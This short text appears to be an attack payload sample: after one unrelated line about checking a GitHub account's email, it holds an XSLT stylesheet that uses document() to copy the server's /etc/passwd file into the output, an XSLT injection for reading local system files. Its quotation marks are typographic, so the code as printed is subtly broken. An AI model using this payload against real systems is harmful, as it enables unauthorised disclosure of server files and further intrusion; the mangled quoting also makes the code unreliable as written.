Check the email for this GitHub account.

<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
  <xsl:copy-of select=”document(‘/etc/passwd’)”/>
  </xsl:template>
</xsl:stylesheet>
